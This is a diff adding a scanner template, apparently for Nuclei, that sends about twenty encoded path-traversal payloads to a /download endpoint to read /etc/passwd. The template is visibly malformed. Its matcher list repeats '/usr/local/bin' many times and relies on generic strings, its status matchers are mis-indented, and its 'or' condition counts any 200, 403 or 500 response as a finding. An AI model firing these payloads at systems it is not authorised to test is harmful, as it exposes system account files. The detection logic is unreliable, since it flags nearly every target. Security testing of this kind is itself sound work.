@@ -1,1 +1,102 @@
+id: Path-Traversal-Detection
+info:
+  name: Path Traversal Detectector
+  author: ZomaSec
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download"
+    params:
+      file:
+        - "../etc/passwd"
+        - "../../etc/passwd"
+        - "..%2fetc%2fpasswd"
+        - "..%252fetc%252fpasswd"
+        - "../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../../etc/passwd%00"
+        - "../../../../../../../../../../../../../../../../etc/passwd%00.jpg"
+        - "..//..//..//..//..//..//..//..//..//..//..//etc/passwd"
+        - "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+        - "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
+        - "..%c0%ae..%c0%ae..%c0%ae..%c0%ae..%c0%ae..%c0%aeetc/passwd"
+        - "..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd"
+        - "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"
+        - "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd"
+        - "..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd"
+        - "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "etc/passwd"
+          - "bin/bash"
+          - "root:x"
+          - "root:*:"
+          - "root:!:"
+          - "root::"
+          - "nobody:x"
+          - "nobody:*:"
+          - "nobody:!:"
+          - "nobody::"
+          - "root:x:"
+          - "root:*:0:0"
+          - "root:x:0:0"
+          - "root:x:0"
+          - "root:*:0"
+          - "root:x:0:0:root:"
+          - "root:x:0:0:root:/root:/bin/bash"
+          - "nobody:x:65534:65534"
+          - "nobody:x:65534:"
+          - "nobody:*:65534:"
+          - "nobody::65534:"
+          - "nobody:x:65534:65534:nobody:"
+          - "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin"
+          - "nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin"
+          - "nobody:x:65534:65534:nobody:/nonexistent:/bin/false"
+          - "root:/bin/bash"
+          - "/usr/bin/python"
+          - "/usr/bin/ruby"
+          - "/usr/bin/perl"
+          - "/usr/bin/php"
+          - "/bin/sh"
+          - "/bin/dash"
+          - "/bin/csh"
+          - "/bin/zsh"
+          - "/bin/false"
+          - "/sbin/nologin"
+          - "/usr/sbin/nologin"
+          - "/bin/bash"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+          - "/usr/local/bin"
+          - "/usr/local/sbin"
+    - type: status
+        status:
+          - 200
+    - type: status
+        status:
+          - 403
+    - type: status
+        status:
+          - 500
 
